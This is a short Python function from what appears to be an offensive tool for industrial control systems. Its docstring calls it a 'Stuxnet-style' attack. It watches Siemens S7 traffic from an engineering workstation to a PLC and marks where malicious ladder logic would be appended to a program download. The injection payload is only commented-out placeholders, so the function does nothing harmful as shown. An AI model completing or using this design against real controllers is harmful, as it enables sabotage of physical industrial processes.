def s7_program_download_injection(data, direction):
    """
    Inject malicious code when engineer downloads program to PLC
    Stuxnet-style attack
    """
    if direction == "EWS→PLC":
        # Detect program download
        if b'\x1B' in data:  # Download Block function
            print("[!] Program download detected")

            # Extract block data
            # Append malicious ladder logic
            # (Requires MC7 bytecode generation)

            # malicious_rung = b'\x...'  # MC7 opcodes
            # modified_data = data + malicious_rung

            print("[ATTACK] Malicious logic injected into download")
            # return modified_data

    return data
